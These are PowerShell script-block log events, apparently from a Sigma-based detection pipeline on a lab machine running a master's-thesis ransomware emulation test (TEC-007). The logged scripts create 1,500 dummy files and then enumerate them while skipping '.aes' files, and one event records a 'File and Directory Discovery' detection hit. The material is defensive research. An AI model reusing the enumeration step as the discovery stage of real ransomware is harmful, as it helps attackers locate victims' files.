{"Timestamp":"2026-07-12T13:27:12.523451089Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3271843,"Details":"ScriptBlock: Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862832.523451},"EventRecordID":3271843,"Correlation":{"ActivityID":"F2694954-11F0-0003-7DCC-6EF2F011DD01"},"Execution":{"ProcessID":3252,"ThreadID":4104},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue","ScriptBlockId":"aee9b7b2-b768-4229-8b9e-2dc3d252773b","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\nSet-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue\n\nId. de bloque de script: aee9b7b2-b768-4229-8b9e-2dc3d252773b\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:12.638825654Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3271864,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862832.6388257},"EventRecordID":3271864,"Correlation":{"ActivityID":"F2694954-11F0-0003-82CC-6EF2F011DD01"},"Execution":{"ProcessID":3252,"ThreadID":4104},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"72af2dea-4848-49d1-8bdd-deeef432cbd3","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: 72af2dea-4848-49d1-8bdd-deeef432cbd3\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:20.777678489Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3271942,"Details":"ScriptBlock: $Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862840.7776785},"EventRecordID":3271942,"Correlation":{"ActivityID":"F2694954-11F0-0003-93CC-6EF2F011DD01"},"Execution":{"ProcessID":9964,"ThreadID":11292},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","ScriptBlockId":"0a36d925-8639-43fd-acc7-a8fe625566f0","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"\n\nId. de bloque de script: 0a36d925-8639-43fd-acc7-a8fe625566f0\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:20.82494235Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3271946,"Details":"ScriptBlock: {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862840.8249424},"EventRecordID":3271946,"Correlation":{"ActivityID":"F2694954-11F0-0001-17E1-6EF2F011DD01"},"Execution":{"ProcessID":9964,"ThreadID":11292},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","ScriptBlockId":"d8115f99-e211-4051-b4d0-d4e265037d51","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\n\nId. de bloque de script: d8115f99-e211-4051-b4d0-d4e265037d51\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:30.440475225Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3274952,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862850.4404752},"EventRecordID":3274952,"Correlation":{"ActivityID":"F2694954-11F0-0001-F6EB-6EF2F011DD01"},"Execution":{"ProcessID":9964,"ThreadID":11292},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"90b32cf3-7564-47ac-b7d4-94730d8a4288","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: 90b32cf3-7564-47ac-b7d4-94730d8a4288\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:31.264336109Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3274970,"Details":"ScriptBlock: param(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862851.264336},"EventRecordID":3274970,"Correlation":{"ActivityID":"F2694954-11F0-0002-04BB-6EF2F011DD01"},"Execution":{"ProcessID":4304,"ThreadID":12228},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"param(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n","ScriptBlockId":"c18da73e-a969-4dbf-be34-7cb375e62d1c","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\nparam(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n\n\nId. de bloque de script: c18da73e-a969-4dbf-be34-7cb375e62d1c\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:31.264336109Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"low","Title":"Powershell File and Directory Discovery","RecordID":3274970,"Details":"ScriptBlock: param(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862851.264336},"EventRecordID":3274970,"Correlation":{"ActivityID":"F2694954-11F0-0002-04BB-6EF2F011DD01"},"Execution":{"ProcessID":4304,"ThreadID":12228},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"param(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n","ScriptBlockId":"c18da73e-a969-4dbf-be34-7cb375e62d1c","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\nparam(\n    [string]$TargetPath = \"\",\n    [string]$OutputDir = \"\"\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($TargetPath)) {\n    $TargetPath = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = $PSScriptRoot\n}\n\nif (-not (Test-Path -LiteralPath $TargetPath)) {\n    throw \"TargetPath does not exist: $TargetPath\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n$TxtFile = Join-Path $OutputDir \"lista_archivos.txt\"\n$CsvFile = Join-Path $OutputDir \"lista_archivos.csv\"\n\n$files = @(\n    Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop |\n    Where-Object { $_.Extension -ne \".aes\" } |\n    Sort-Object FullName\n)\n\n$files | Select-Object -ExpandProperty FullName | Set-Content -LiteralPath $TxtFile -Encoding UTF8\n$files | Select-Object Name,FullName,Length,LastWriteTime | Export-Csv -LiteralPath $CsvFile -NoTypeInformation -Encoding UTF8\n\nWrite-Host \"TXT guardado: $TxtFile\"\nWrite-Host \"CSV guardado: $CsvFile\"\nWrite-Host \"Formato CSV: Name,FullName,Length,LastWriteTime\"\nWrite-Host \"Files enumerated: $($files.Count)\"\n\n\nId. de bloque de script: c18da73e-a969-4dbf-be34-7cb375e62d1c\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:31.429491281Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3274978,"Details":"ScriptBlock: { $_.Extension -ne \".aes\" }","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862851.4294913},"EventRecordID":3274978,"Correlation":{"ActivityID":"F2694954-11F0-0003-66DE-6EF2F011DD01"},"Execution":{"ProcessID":4304,"ThreadID":12228},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ $_.Extension -ne \".aes\" }","ScriptBlockId":"cc3fdc25-977d-4f55-b5ba-75605093db57","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{ $_.Extension -ne \".aes\" }\n\nId. de bloque de script: cc3fdc25-977d-4f55-b5ba-75605093db57\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:31.506766319Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3275080,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862851.5067663},"EventRecordID":3275080,"Correlation":{"ActivityID":"F2694954-11F0-0003-6BDE-6EF2F011DD01"},"Execution":{"ProcessID":4304,"ThreadID":12228},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"ca9e3e1e-9a8d-4358-9c3b-f2e96ea00897","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: ca9e3e1e-9a8d-4358-9c3b-f2e96ea00897\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
